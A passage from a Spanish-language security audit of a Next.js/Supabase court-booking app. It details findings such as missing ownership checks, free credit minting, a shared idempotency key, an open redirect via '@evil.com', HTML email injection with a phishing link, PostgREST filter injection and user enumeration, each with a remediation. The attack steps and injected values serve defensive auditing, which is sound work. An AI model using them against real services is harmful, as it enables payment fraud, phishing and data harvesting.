  const supabase = await createClient()
  const { data: { user } } = await supabase.auth.getUser()
  if (!user) throw new Error("No autenticado")

  const { error } = await supabase.from("bookings")
    .update({ payment_status: paymentStatus } as never)
    .eq("id", bookingId)
```

**Por qué es explotable.** El único control es "hay sesión". No se consulta el `role` del perfil, no se verifica que `bookingId` pertenezca a un venue del usuario. Compárese con `dashboard/schedule/actions.ts:23-31` y `dashboard/venue/actions.ts:42-50`, que **sí** hacen la verificación de ownership — la inconsistencia muestra que la omisión no es una decisión de diseño.

Las Server Actions de Next.js son endpoints `POST` alcanzables por cualquiera que conozca el Action ID, y ese ID viaja en los chunks de `/_next/static/chunks/` que se sirven sin autenticación. Un `player` puede extraerlos y postear directamente; el `redirect('/')` del `dashboard/layout.tsx:25-27` solo afecta al renderizado de páginas, no a las actions.

Hoy el daño lo contiene RLS + el trigger. Pero encadenado con SEC-02/SEC-03: `updateBookingStatus(<mi booking>, 'completed')` es exactamente el paso 3 de SEC-09, y `updatePaymentStatus` pasa el trigger sin objeción en cuanto el `court_id` apunta a una cancha propia.

También aplica a `updatePricing(courtId, ...)` y `saveOffers(courtId, ...)` (`courts/actions.ts:67,101`): reciben un `courtId` arbitrario y hacen `DELETE FROM pricing_rules WHERE court_id = <input>` sin comprobar nada. Hoy RLS lo frena, y como un `DELETE` bloqueado por RLS borra 0 filas en silencio, la acción reporta éxito.

**Impacto.** Cero defensa en profundidad en la capa que debería tenerla. Cualquier regresión futura en RLS o en el trigger se convierte al instante en escritura arbitraria sobre reservas y precios.

**Remediación sugerida.** Un helper `requireVenueOwner(supabase, resourceId)` invocado al inicio de cada action del dashboard, que resuelva el venue del recurso y compare con `auth.getUser()`, más una comprobación explícita de `profile.role`. Y validar la entrada con los esquemas Zod que ya están escritos y sin usar (SEC-26).

---

### SEC-12 — ALTO — Se emite crédito sin verificar que la seña se haya pagado

**Ubicación:** `src/lib/booking/actions.ts:22-43` y `src/lib/credits/manager.ts:30-37`.

```ts
// src/lib/booking/actions.ts:22-43
  // 2. Check cancellation policy
  const policy = calculateCancellationPolicy(booking)
  if (!policy.canCancel) { throw new Error(policy.reason) }
  ...
  // 4. Si corresponde crédito, lo creamos
  if (policy.refundType === 'credit' && policy.creditAmount > 0) {
    await createCredit(user.id, booking.id, booking.courts.venues.id, policy.creditAmount)
  }
```

```ts
// src/lib/credits/manager.ts:30-37
    const depositAmount = booking.deposit_amount || 0;
    return { canCancel: true, refundType: 'credit', creditAmount: depositAmount, ... }
```

**Por qué es explotable.** En ningún punto del flujo se comprueba `booking.payment_status === 'paid'`. `deposit_amount` se escribe en el momento de crear la reserva *pendiente* (`create-preference/route.ts:75`), antes de que exista pago alguno. `createCredit` usa `createAdminClient()` (`manager.ts:60`), así que escribe en `credits` saltándose RLS.

Ataque (una vez arreglado SEC-14, ver más abajo):

1. `POST /api/booking/create-preference` para un slot a ≥ 6 h vista → booking `B` con `deposit_amount = 7500`, `payment_status='pending'`. **No pagar.**
2. Leer el `id` de `B` (`GET /rest/v1/bookings?user_id=eq.<uid>&payment_status=eq.pending`, permitido por `002:67-75`).
3. `POST /api/booking/cancel {"bookingId":"B"}` — antes de los 3 minutos del cron de purga (`019:22`).
4. `createCredit` inserta $7.500 de crédito de la nada.
5. Bucle. Los créditos así generados sirven para pagar reservas reales a coste cero (`create-preference/route.ts:94-103`).

**Por qué lo marco ALTO y no CRÍTICO:** hoy está **enmascarado** por SEC-14. Con `hoursUntilBooking` devolviendo `NaN`, `diffHours >= 6` es `false` y `calculateCancellationPolicy` siempre cae en la rama `forfeit` con `creditAmount: 0`. El agujero de moneda infinita está armado y con el seguro puesto por accidente. En cuanto alguien arregle el bug de fechas — que ya está en la lista de pendientes del equipo como BUG-FIN-01 — se convierte en CRÍTICO el mismo día, sin que nadie lo relacione.

**Impacto (una vez destapado).** Emisión ilimitada de moneda interna. $7.500 por iteración, automatizable a cientos por minuto; cada crédito es una obligación real de la plataforma frente al complejo.

**Remediación sugerida.** `calculateCancellationPolicy` (o mejor, `cancelBooking` antes de llamarla) debe exigir `booking.payment_status === 'paid'` para cualquier `refundType === 'credit'`, y el `creditAmount` debe salir del monto realmente cobrado (registrado desde el webhook de MP), no de `deposit_amount` escrito optimistamente al crear la reserva.

---

### SEC-13 — ALTO — `idempotencyKey: 'abc'` global y estático en el cliente de Mercado Pago

**Ubicación:** `src/lib/mercadopago/client.ts:4-7`.

```ts
const client = new MercadoPagoConfig({
  accessToken: process.env.MERCADOPAGO_ACCESS_TOKEN || 'TEST-dummy-token',
  options: { timeout: 5000, idempotencyKey: 'abc' }
})
```

**Por qué es explotable.** El `MercadoPagoConfig` se instancia una sola vez a nivel de módulo y todas las llamadas a `preference.create()` (`client.ts:32`) comparten la misma `X-Idempotency-Key`. La semántica de idempotencia de Mercado Pago es: misma clave → se devuelve la respuesta cacheada de la primera petición (o se rechaza si el body difiere).

Consecuencia: a partir de la primera preferencia creada por esa instancia del proceso, **todas las siguientes devuelven la preferencia del primer usuario**, con su `unit_price`, su `external_reference` (= `bookingId` del primer usuario) y sus `back_urls`. El usuario B es enviado al checkout de la reserva de A. Si paga, el webhook recibe `external_reference` = booking de A y confirma **la reserva de A**, mientras la reserva de B queda pendiente hasta que el cron la borra.

Esto no es solo un bug funcional: es una **confusión de identidad en el flujo de pago**. Un atacante que gatille la primera preferencia del ciclo de vida del proceso con una reserva propia barata cobra los pagos de todos los que reserven después en esa instancia.

**Impacto.** Pagos atribuidos a la reserva equivocada, reservas legítimas perdidas, y un vector de apropiación de pagos ajenos. En Vercel, cada instancia serverless fría reinicia el módulo, así que el efecto es intermitente y endiabladamente difícil de diagnosticar en producción.

`[NO CONFIRMADO]` en un punto: no ejecuté contra la API de MP para determinar si el SDK v3 propaga la clave del config a cada request o si con body distinto MP devuelve 422 en vez del recurso cacheado. Confirmarlo requiere una llamada real al sandbox. En cualquiera de las dos ramas el comportamiento es incorrecto y hay que arreglarlo.

**Remediación sugerida.** Generar la clave por transacción (`crypto.randomUUID()`, o el propio `bookingId`, que es único y hace la operación genuinamente idempotente por reserva) y pasarla como opción de la llamada `preference.create()`, no del config compartido.

---

### SEC-14 — ALTO — La política de cancelación está rota por un `NaN`: nadie recupera nunca su seña

**Ubicación:** `src/lib/utils/dates.ts:59-63`, consumida en `src/lib/credits/manager.ts:6` y `:50`.

```ts
export function hoursUntilBooking(bookingDate: string, startTime: string): number {
  const bookingDateTime = new Date(`${bookingDate}T${startTime}:00-03:00`)
  const now = new Date()
  return (bookingDateTime.getTime() - now.getTime()) / (1000 * 60 * 60)
}
```

**Por qué es explotable / por qué duele.** El parámetro `startTime` viene de la columna `bookings.start_time`, de tipo `time`, que PostgREST serializa como `"21:00:00"`. La plantilla produce entonces `2026-09-05T21:00:00:00-03:00`. Verificado localmente:

```
$ node -e "const d=new Date('2026-09-05T21:00:00:00-03:00'); console.log(d.toString(), isNaN(d.getTime()))"
Invalid Date true
```

Con `NaN`, **todas** las comparaciones son `false`:

- `manager.ts:9` `if (diffHours <= 1)` → false
- `manager.ts:19` `if (diffHours >= 6)` → false
- → cae en `manager.ts:41-46`: `{ canCancel: true, refundType: 'forfeit', creditAmount: 0 }`
- `manager.ts:52` `if (diffHours >= 2)` → false → `canReschedule` devuelve siempre `{ allowed: false }`

Resultado en producción:

1. Un usuario cancela con **tres días** de anticipación. `cancelBooking` marca la reserva cancelada y le da **cero crédito**. La plataforma se queda con su seña de $7.500.
2. Y el email que ese usuario recibió al confirmar dice, literalmente, `src/lib/notifications/templates.ts:41`: *"podés cancelar hasta 6 horas antes para recuperar tu seña en forma de créditos"*.
3. `rescheduleBooking` (`lib/booking/actions.ts:74-77`) lanza siempre `Reprogramación no permitida`. La funcionalidad está muerta.

**Impacto.** Retención sistemática e indebida de señas contra los términos comunicados por escrito al usuario. Con 100 cancelaciones anticipadas al mes a $7.500, son **$750.000 mensuales** que la plataforma retiene sin derecho. Es un problema de defensa del consumidor (Ley 24.240) antes que de seguridad, y genera contracargos.

**Remediación sugerida.** Normalizar el formato antes de construir la fecha (`startTime.slice(0,5)` o construir desde componentes), y añadir un test que use exactamente el formato `HH:MM:SS` que devuelve la base. Hacer que `hoursUntilBooking` lance o devuelva un sentinela explícito ante entrada inválida, en lugar de propagar `NaN` en silencio hacia una decisión de dinero. **Antes de aplicar este fix, cerrar SEC-12** — de lo contrario se destapa la emisión infinita de créditos.

---

### SEC-15 — MEDIO — Open redirect en el callback de OAuth

**Ubicación:** `src/app/(auth)/callback/route.ts:5-14`, alimentado desde `src/hooks/useUser.ts:85` y `src/app/(auth)/login/page.tsx:24`.

```ts
  const { searchParams, origin } = new URL(request.url)
  const code = searchParams.get('code')
  const next = searchParams.get('next') ?? '/'
  if (code) {
    ...
    if (!error) {
      return NextResponse.redirect(`${origin}${next}`)
```

**Por qué es explotable.** `origin` no lleva barra final (`https://reservaya.com`). Concatenar un `next` que empiece con `@` produce una URL cuyo *authority* cambia de host:

```
$ node -e "console.log(new URL('https://reservaya.com'+'@evil.com').host)"
evil.com
```

`https://reservaya.com@evil.com` se interpreta como usuario `https://reservaya.com` en el host `evil.com`.

Cadena completa: `login/page.tsx:24` lee `next` de la query sin validar y `useUser.ts:85` lo interpola **sin encodear** en `redirectTo: ${window.location.origin}/callback?next=${next}`. Entonces:

1. Atacante manda a la víctima `https://reservaya.com/login?next=@evil.com`.
2. La víctima hace clic en "Continuar con Google". El `redirectTo` registrado es `https://reservaya.com/callback?next=@evil.com` (coincide con el patrón `https://reservaya.com/**` de la allowlist de Supabase).
3. Google → Supabase → `https://reservaya.com/callback?code=...&next=@evil.com`.
4. `exchangeCodeForSession` tiene éxito, se setea la cookie de sesión, y el usuario **aterriza en `https://evil.com`** viniendo de un login exitoso legítimo.

No hay fuga de token (la query no se propaga al destino y la cookie es de `reservaya.com`), por eso es MEDIO y no ALTO. Pero es un phishing de altísima conversión: la víctima acaba de autenticarse de verdad en el dominio real, y una réplica de la app pidiendo "confirmá tu teléfono / datos de cobro" es plenamente creíble.

**Remediación sugerida.** Validar que `next` sea una ruta relativa segura antes de usarla: rechazar todo lo que no matchee `^\/(?!\/)[A-Za-z0-9\-._~!$&'()*+,;=:@%\/?#]*$`, o mejor, construir el destino con `new URL(next, origin)` y verificar que `url.origin === origin`. Encodear `next` en `useUser.ts:85` con `encodeURIComponent`. Y unificar el nombre del parámetro: hoy conviven `next` (login), `redirect_to` (`middleware.ts:42`) y `returnUrl` (`booking/[courtId]/page.tsx:19-20`), tres nombres para lo mismo y solo uno funciona.

---

### SEC-16 — MEDIO — La pantalla de éxito certifica un pago que no verificó

**Ubicación:** `src/app/(main)/booking/[courtId]/success/page.tsx:25-40` y `:63-64,90-95`.

```tsx
  const _bRes = await supabase.from("bookings")
    .select(`...`)
    .eq("id", booking_id)
    .eq("user_id", user.id)
    .single()
  ...
          <h1 className="text-2xl font-black text-green-500 mb-2">¡Reserva Confirmada!</h1>
          <p className="text-muted-foreground">Tu pago ha sido procesado exitosamente y la cancha ya es tuya.</p>
  ...
          {booking.courts.venues.require_deposit && (
              <span className="text-muted-foreground">Seña abonada:</span>
              <span className="font-bold text-primary">${Math.ceil(booking.total_price * (...)).toLocaleString('es-AR')}</span>
```

**Por qué es explotable.** La página carga la reserva y verifica que sea del usuario, pero **nunca mira `booking.payment_status` ni `booking.status`**. Renderiza el mismo cartel verde y el mismo "Seña abonada: $7.500" tanto para una reserva pagada como para una `pending` abandonada.

Ataque: iniciar la reserva, abandonar el checkout de MP, navegar a mano a `/booking/<courtId>/success?booking_id=<mi booking pending>`. Screenshot. Presentarlo en el mostrador del complejo. Tiene la marca, el nombre real de la cancha, la fecha, la dirección y el monto — es indistinguible de un comprobante genuino.

Se combina bien con SEC-29: la reserva pendiente vive 3 minutos en la base, pero el screenshot es para siempre.

**Impacto.** Comprobantes de pago falsificables sin ninguna herramienta. Fricción y pérdida directa para los complejos, que aceptarán turnos no pagados y se pelearán con la plataforma por la seña.

**Remediación sugerida.** Si `payment_status !== 'paid'`, mostrar un estado "pago pendiente" con el CTA para completarlo, nunca el cartel de confirmación. Calcular el monto mostrado desde `deposit_amount` real (no recalculando el porcentaje sobre `total_price`, como hace la línea 93).

---

### SEC-17 — MEDIO — Reprogramación sin recotizar y sin límite de intentos

**Ubicación:** `src/lib/booking/actions.ts:59-105`.

```ts
  const { error: updateError } = await adminSupabase.from("bookings")
    .update({
      booking_date: newDate,
      start_time: newTime,
      is_rescheduled: true
    } as never)
    .eq("id", bookingId)
```

**Por qué es explotable.** No se consulta `pricing_rules` para el nuevo slot, así que `total_price` y `deposit_amount` quedan congelados en la tarifa del horario original. Tampoco se verifica `booking.is_rescheduled` en `canReschedule` (`manager.ts:49-57`) ni `booking.status !== 'cancelled'` ni que `newDate` sea futura.

Arbitraje: reservar el martes 11:00 (valle, $12.000, seña $3.600), pagar, y reprogramar al sábado 21:00 (prime, $30.000). Se juega en el horario caro pagando la seña del barato y debiendo en mostrador el saldo del precio viejo. Diferencia: $18.000 por operación.

Mitigante actual: SEC-14 hace que `canReschedule` devuelva siempre `false`, así que la función es hoy inalcanzable. Igual que SEC-12, es una bomba con temporizador atada al fix del `NaN`. Adicionalmente, `lib/booking/actions.ts` **no tiene la directiva `"use server"`** (la línea 1 es un `eslint-disable`), y ningún componente la importa hoy — la UI de `reschedule-dialog.tsx` no está conectada.

**Remediación sugerida.** Recotizar el nuevo slot contra `pricing_rules` y, si el precio sube, exigir el pago de la diferencia antes de confirmar. Bloquear si `is_rescheduled` ya es `true`. Validar que el nuevo horario sea futuro. Y validar la entrada con `RescheduleBookingSchema`, que ya existe en `validators.ts:42-47` sin usarse.

---

### SEC-18 — MEDIO — Inyección de HTML en el email de notificación de chat

**Ubicación:** `src/app/actions/chat.ts:61-69`.

```ts
        resend!.emails.send({
          from: 'ReservaYa <mensajes@reservaya.com>',
          to: owner.email,
          subject: `¡Nueva consulta en ${conversation.venues.name}!`,
          html: `<p>Tienes un nuevo mensaje de un jugador.</p>
                 <p><strong>Mensaje:</strong> "${content}"</p>
```

**Por qué es explotable.** `content` es el texto crudo del mensaje del jugador, interpolado sin escapar en el `html` del email. Tampoco hay límite de longitud (el `SendMessageSchema` de `validators.ts:59-64` que lo acotaría a 1000 caracteres no se usa).

Ataque: enviar por el chat un mensaje cuyo contenido sea
`<a href="https://reservaya-panel.tld/login">URGENTE: verificá tu cuenta bancaria para cobrar tus reservas</a><style>p{display:none}</style>`
El dueño recibe un correo **firmado con el DKIM de `reservaya.com`**, desde `mensajes@reservaya.com`, con un enlace de phishing. Pasa SPF/DKIM/DMARC y aterriza en bandeja de entrada.

El mismo defecto está en las plantillas: `src/lib/notifications/templates.ts:26` y `:29` interpolan `${user.full_name}` y `${venue.name}` sin escapar, y ambos son campos que el atacante controla (`full_name` desde `/profile`, `venue.name` desde SEC-03).

**Impacto.** Phishing contra los comercios usando la reputación de envío de la propia plataforma — el peor tipo, porque quema el dominio ante los filtros y compromete a quien maneja el dinero.

**Remediación sugerida.** Escapar `&<>"'` en toda interpolación dentro de plantillas HTML de email (o pasar a React Email / plantillas con escapado por defecto), y aplicar `SendMessageSchema` en el borde de `sendMessage`.

---

### SEC-19 — MEDIO — Inyección de filtros PostgREST vía `.or()`

**Ubicación:** `src/app/(main)/search/page.tsx:54-56`.

```ts
  if (q) {
    query = query.or(`name.ilike.%${q}%,city.ilike.%${q}%,address.ilike.%${q}%`)
  }
```

**Por qué es explotable.** `q` sale directo de `searchParams` (línea 14, solo `.toLowerCase()`) y se concatena en la mini-gramática de filtros de PostgREST, donde `,`, `.`, `(` y `)` son metacaracteres. Un `q` como `x%,id.not.is.null` inyecta una condición adicional en el `OR`, y como el `OR` está en disyunción con los términos legítimos, la cláusula inyectada domina el resultado.

No es SQLi: PostgREST parsea la expresión y la traduce a SQL parametrizado, así que no se puede saltar a otra tabla ni exfiltrar datos arbitrarios. Lo que sí se consigue es manipular el conjunto de resultados, provocar errores 400 con detalle del parser (fingerprinting del esquema) y forzar consultas costosas — combinado con la ausencia de rate limiting (SEC-23) y de un índice `pg_trgm`, es una primitiva de DoS barata contra la base.

**Remediación sugerida.** Escapar o rechazar `,`, `.`, `(`, `)`, `"` y `\` en `q` antes de construir el filtro (o mejor: usar `textSearch` con una columna `tsvector`, que además arregla el rendimiento). Limitar la longitud de `q`.

---

### SEC-20 — MEDIO — `public_user_profiles` expone el padrón de usuarios a la anon key

**Ubicación:** `supabase/migrations/015_close_phase_0.sql:15-18`.

```sql
-- Create a secure public view for avatars and names (for chat and reviews)
CREATE OR REPLACE VIEW public.public_user_profiles AS
SELECT id, full_name, avatar_url
FROM public.profiles;
```

**Por qué es explotable.** La vista se crea **sin `WITH (security_invoker = true)`**, por lo que se ejecuta con los privilegios de su propietario (`postgres`) y **atraviesa el RLS de `profiles`** que la misma migración acababa de endurecer en `015:12-13`. Y no hay ningún `REVOKE`: con las default privileges de Supabase sobre el esquema `public`, los roles `anon` y `authenticated` pueden leerla.

Ataque, sin cuenta: `GET https://<ref>.supabase.co/rest/v1/public_user_profiles?select=*` con la anon key del bundle → nombre completo y avatar de **todos** los usuarios registrados, con su `id` (que además es el `auth.users.id`). No hay `LIMIT` por defecto que lo impida más allá del `max-rows` del proyecto, y la paginación por `Range` completa el volcado.

Es cierto que expone menos que la policy `USING (true)` original (ya no salen `email`, `phone`, `role` ni `credit_balance`): la remediación mejoró las cosas. Pero convertir "el padrón entero es enumerable" en "el padrón entero es enumerable, con menos columnas" no es cerrar el hallazgo.

**Impacto.** Enumeración completa de la base de usuarios: nombre real + UUID. Insumo para spear phishing y para correlacionar identidades con las reseñas públicas.

**Remediación sugerida.** No exponer la vista como tabla consultable: `REVOKE ALL ON public.public_user_profiles FROM anon, authenticated` y resolver los joins de reseñas/chat desde el servidor con el admin client, devolviendo solo los perfiles de los usuarios que aparecen en el recurso pedido. Si la vista tiene que quedar, al menos declararla `security_invoker` y añadir una policy que la acote.

---

### SEC-21 — MEDIO — Ninguna función `SECURITY DEFINER` fija `search_path`

**Ubicación:** todas. `001_initial_schema.sql:132,158,171`; `002_rls_policies.sql:19`; `009_chat_schema.sql:45`; `012:14`; `013:28`; `014:46`; `017:56`; `018:29,83`; `019:23`; `020:17`. Ejemplo:

```sql
-- 002_rls_policies.sql:11-19
CREATE OR REPLACE FUNCTION public.is_platform_admin()
RETURNS BOOLEAN AS $$
BEGIN
  RETURN EXISTS (
    SELECT 1 FROM public.profiles
    WHERE id = auth.uid() AND role = 'platform_admin'
  );
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

Grep sobre todas las migraciones: **cero ocurrencias de `search_path`, `GRANT` o `REVOKE`.**

**Por qué importa.** Una función `SECURITY DEFINER` corre con los privilegios del propietario (`postgres`, superusuario en Supabase). Si un atacante consigue crear un objeto que resuelva antes que el pretendido en el `search_path` de la sesión invocante, secuestra la ejecución con privilegios de superusuario. `is_platform_admin()` es el peor caso porque es la puerta de `platform_admin` en once políticas y en ambos triggers de protección.

Marco esto MEDIO, no ALTO: los identificadores están calificados con `public.` en la mayoría de los cuerpos, y en Postgres 15+ el esquema `public` ya no es escribible por defecto para todos los roles, lo que cierra el vector obvio. `[NO CONFIRMADO]`: qué `GRANT`s tiene realmente el esquema `public` en este proyecto (Supabase históricamente concedía `CREATE ON SCHEMA public TO anon, authenticated`). Para confirmarlo: `SELECT nspname, nspacl FROM pg_namespace WHERE nspname='public'` y `\df+ public.*` para ver `proconfig`.

**Remediación sugerida.** Añadir `SET search_path = public, pg_temp` a la definición de cada función `SECURITY DEFINER`, y `REVOKE EXECUTE ... FROM PUBLIC` en las que no deban ser llamables por clientes (todas menos `get_venue_availability`).

---

### SEC-22 — MEDIO — Storage: escritura libre, sin límite de tamaño, sin MIME allowlist, con path arbitrario

**Ubicación:** `supabase/migrations/010_chat_attachments_and_storage.sql:5-16` y `:31-33`.

```sql
INSERT INTO storage.buckets (id, name, public)
VALUES ('chat-images', 'chat-images', true)
ON CONFLICT (id) DO NOTHING;
...
CREATE POLICY "Authenticated users can upload chat images"
ON storage.objects FOR INSERT TO authenticated
WITH CHECK (bucket_id = 'chat-images');
```

**Por qué es explotable.** El `INSERT INTO storage.buckets` no especifica `file_size_limit` ni `allowed_mime_types` — ambos quedan `NULL`, es decir, sin límite. Y el `WITH CHECK` de la policy solo mira el `bucket_id`: no acota el prefijo del path ni el `owner`. El código de la app construye `${conversationId}/${Date.now()}.${fileExt}` (`player-chat-modal.tsx:182`, `admin-chat-thread.tsx:158`, `venue-photos-form.tsx:33`) con `fileExt` tomado del nombre del archivo del usuario, pero eso es una convención del cliente: nada impide llamar a `supabase.storage.from('chat-images').upload('cualquier/ruta.html', blob)` con `contentType: 'text/html'` directamente desde la consola.

Consecuencias: (a) hosting de HTML arbitrario bajo el dominio `<ref>.supabase.co` para phishing — distinto origen que la app, así que no roba su sesión, pero sí abusa de la marca; (b) escritura en el prefijo de conversaciones ajenas, permitiendo pisar visualmente adjuntos de otros; (c) subida ilimitada en tamaño y cantidad → coste de almacenamiento y de egress a cargo del proyecto.

**Remediación sugerida.** Definir `file_size_limit` (p. ej. 5 MB) y `allowed_mime_types` (`image/jpeg, image/png, image/webp`) en el bucket, y añadir al `WITH CHECK` que `(storage.foldername(name))[1]` sea un `conversation_id` al que `auth.uid()` tenga acceso (para `venue-photos`, un `venue_id` del que sea `owner_id`).

---

### SEC-23 — MEDIO — Sin cabeceras de seguridad, sin CSP, sin rate limiting

**Ubicación:** `next.config.mjs:1-15` (archivo completo).

```js
const nextConfig = {
  images: {
    remotePatterns: [
      { protocol: 'https', hostname: 'images.unsplash.com' },
      { protocol: 'https', hostname: 'placehold.co' },
    ],
  },
};
```

No hay bloque `headers()`. No hay `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`/`frame-ancestors`, `X-Content-Type-Options`, `Referrer-Policy` ni `Permissions-Policy`. Grep de `ratelimit|rate-limit|upstash|arcjet` sobre `package.json` y `src/`: **cero resultados**.

**Por qué importa.** Una CSP con `script-src` sin `unsafe-inline` habría contenido el impacto de SEC-01, que hoy es toma de cuenta directa. Sin `frame-ancestors` la app es encuadrable → clickjacking sobre los botones de confirmación de reserva y de cancelación. Sin rate limiting, todos los ataques descritos aquí (SEC-04 con concurrencia, SEC-09 en bucle, SEC-12 en bucle, SEC-19 con consultas caras, SEC-05 como DoS del webhook) se ejecutan sin fricción, y `/api/booking/create-preference` es un generador de filas de `bookings` gratuito para cualquier autenticado.

**Remediación sugerida.** Añadir el bloque `headers()` en `next.config.mjs` con CSP (empezando en report-only), HSTS, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin` y `frame-ancestors 'none'`. Añadir rate limiting por IP y por `user.id` al menos en `/api/booking/create-preference`, `/api/booking/cancel`, `sendMessage` y el webhook.

---

### SEC-24 — MEDIO — Fuga de mensajes de error internos en respuestas 500

**Ubicación:** `src/app/api/booking/create-preference/route.ts:114-117` y `src/app/api/webhooks/mercadopago/route.ts:93-97`.

```ts
  } catch (error: unknown) {
    // @ts-expect-error fix inference
    return NextResponse.json({ error: error.message }, { status: 500 })
  }
```

**Por qué importa.** Los errores que llegan a ese `catch` provienen de PostgREST y del SDK de Mercado Pago, y sus mensajes incluyen nombres de tabla y columna, textos de constraints (`bookings_no_double_booking_idx`), y los mensajes literales de los triggers (`Unauthorized: Cannot modify payment status`). Es un mapa gratuito del esquema y de la lógica de autorización para quien esté montando los ataques de SEC-02 y SEC-04 — le dice exactamente qué comprobación acaba de tocar.

Detalle adicional: el mismo `catch` de `create-preference` captura errores lanzados **después** de que la reserva pendiente ya fue insertada (línea 68) y de que los créditos ya fueron bloqueados (línea 90), sin compensación alguna. Un fallo en `createPaymentPreference` deja crédito bloqueado sin reserva viable.

**Remediación sugerida.** Devolver un mensaje genérico con un identificador de correlación y loguear el detalle del lado servidor. Envolver el flujo de create-preference en una compensación que libere créditos y borre la reserva pendiente si algo falla después de la inserción.

---

### SEC-25 — MEDIO — `bookings` no tiene política `FOR DELETE`: la cancelación de pendientes falla en silencio

**Ubicación:** `src/app/actions/booking.ts:11-23`, contra las políticas de `002_rls_policies.sql:66-88`.

```ts
  const { error } = await supabase
    .from("bookings")
    .delete()
    .eq("id", bookingId)
    .eq("user_id", userData.user.id)
    .eq("payment_status", "pending")

  if (error) { ... return { success: false, error: error.message } }
  return { success: true }
```

**Por qué importa.** Grepeando `FOR DELETE` en todas las migraciones aparece solo en `venues` (`002:40`) y en `storage.objects` (`010:27,44`). **`bookings` no tiene ninguna política de DELETE**, y con RLS activo eso significa denegación total. Un `DELETE` que RLS filtra no devuelve error: borra cero filas y `error` es `null`. La acción devuelve `{ success: true }` y la UI le dice al usuario que su reserva pendiente se canceló, cuando sigue ahí bloqueando el slot hasta que el cron la barra (3 minutos, ver SEC-29).

**Impacto.** Slots bloqueados fantasma, feedback falso al usuario, y una función de "cancelar" que nunca funcionó y que nadie detectó porque no falla ruidosamente.

**Remediación sugerida.** O bien añadir una policy `FOR DELETE USING (user_id = auth.uid() AND payment_status = 'pending' AND status = 'pending')`, o bien ejecutar la operación con el admin client tras verificar ownership en el servidor. En cualquier caso, comprobar el número de filas afectadas (`.select()` tras el delete) antes de reportar éxito — patrón aplicable a todas las mutaciones RLS de la app.

---

### SEC-26 — BAJO — Zod está instalado y escrito, con cero importadores

**Ubicación:** `src/lib/utils/validators.ts:1-75`; `package.json:40` (`"zod": "^4.5.4"`).

```
$ grep -rn "validators\|utils/validators" src/
(sin resultados)
```

Hay ocho esquemas completos y bien diseñados (`CreateBookingSchema`, `CancelBookingSchema`, `RescheduleBookingSchema`, `SubmitReviewSchema`, `SendMessageSchema`, `UpdateVenueProfileSchema`...) y **ninguno se importa en ningún archivo**. Mientras tanto, cada route handler y cada Server Action hace su propia validación ad-hoc: `if (!title || !courtId || !date || !time)` (`create-preference/route.ts:17`), `parseFloat(formData.get("price") as string) || 0` (`schedule/actions.ts:16`), `JSON.parse(offersJson)` sin esquema (`courts/actions.ts:111`).

Lo marco BAJO porque hoy Postgres rechaza la mayoría de los tipos malformados. Pero es la razón de fondo por la que ninguno de los bordes de esta app valida nada, y varios hallazgos de arriba (SEC-17, SEC-18, SEC-19) se cerrarían de paso al cablear los esquemas que ya existen.

**Remediación sugerida.** Aplicar `Schema.parse()` en la primera línea de cada route handler y Server Action. El trabajo ya está hecho; falta conectarlo.

---

### SEC-27 — BAJO — `NEXT_PUBLIC_APP_URL` no existe: los webhooks y los back_urls apuntan a localhost

**Ubicación:** `src/lib/mercadopago/client.ts:20`, `:44-49`.

```ts
  const baseUrl = process.env.NEXT_PUBLIC_APP_URL || 'http://localhost:3000'
  ...
        notification_url: `${baseUrl}/api/webhooks/mercadopago`,
```

`.env.local` define cinco variables y **`NEXT_PUBLIC_APP_URL` no es una de ellas**; tampoco figura en `.env.local.example`. Si se despliega con ese conjunto de variables, Mercado Pago recibe `notification_url: http://localhost:3000/api/webhooks/mercadopago` y `back_urls` a localhost. Resultado: los webhooks nunca llegan, ninguna reserva pagada se confirma jamás, y el usuario que paga es devuelto a una URL rota. Dinero cobrado, cero reservas.

**Remediación sugerida.** Añadir `NEXT_PUBLIC_APP_URL` a `.env.local.example` y hacer que el módulo lance en build/arranque si no está definida en producción, en lugar de caer a un default de desarrollo.

---

### SEC-28 — BAJO — Ruta `/mock-payment` eliminada pero el código sigue generando su URL

**Ubicación:** `src/lib/mercadopago/client.ts:22-28`.

```ts
  if (!process.env.MERCADOPAGO_ACCESS_TOKEN || process.env.MERCADOPAGO_ACCESS_TOKEN.startsWith('TEST-')) {
    console.log("Mocking Mercado Pago payment due to missing or TEST- token")
    return {
      id: "mock_preference_id_" + bookingId,
      init_point: `/mock-payment?booking_id=${bookingId}&court_id=${courtId}&price=${price}`,
```

`src/app/(main)/mock-payment/page.tsx` está marcado como `D` (borrado) en el working tree, y grep confirma que las únicas referencias vivas a `/mock-payment` son estas dos líneas.

**Buena noticia:** el backdoor está efectivamente cerrado. La página que confirmaba reservas sin pagar ya no existe, y esa parte de la remediación previa (SEC-02 del reporte anterior) **sí se cumplió**. Lo verifiqué.

**Riesgo residual:** con un token `TEST-` (o sin token), `create-preference` devuelve un `init_point` relativo y `booking-wizard.tsx:67` hace `window.location.href = data.initPoint` → 404 en medio del flujo de pago, con la reserva pendiente ya creada y los créditos ya bloqueados. Y la rama de mock sigue viva esperando que alguien vuelva a crear la página.

**Remediación sugerida.** Eliminar el bloque de mock por completo; en su lugar, fallar ruidosamente si `MERCADOPAGO_ACCESS_TOKEN` no está configurado en producción.

---

### SEC-29 — BAJO — Regresión: el cron de purga volvió de 15 minutos a 3

**Ubicación:** `supabase/migrations/019_credit_locks.sql:15` y `:22`, que sobrescribe `016_extend_booking_cron.sql:10`.

```sql
-- 016 (correcto):  AND created_at < NOW() - INTERVAL '15 minutes';
-- 019 (regresión): AND created_at < NOW() - INTERVAL '3 minutes';
```

`019` redefine `delete_abandoned_bookings()` completa con `CREATE OR REPLACE` y reintroduce el intervalo de 3 minutos que `016` había corregido explícitamente. El cron corre cada minuto (`012:26-30`).

**Impacto.** Un usuario que tarda más de 3 minutos en el checkout de Mercado Pago (introducir tarjeta, 3-D Secure, OTP del banco — perfectamente normal) ve su reserva **borrada mientras paga**. Cuando el webhook llega, `UPDATE bookings ... WHERE id = <borrado>` afecta cero filas, `.single()` devuelve error y la ruta cae a 500 (`webhooks/mercadopago/route.ts:68-71`). Pago cobrado, reserva inexistente, y el slot potencialmente revendido a otro. Contracargo garantizado.

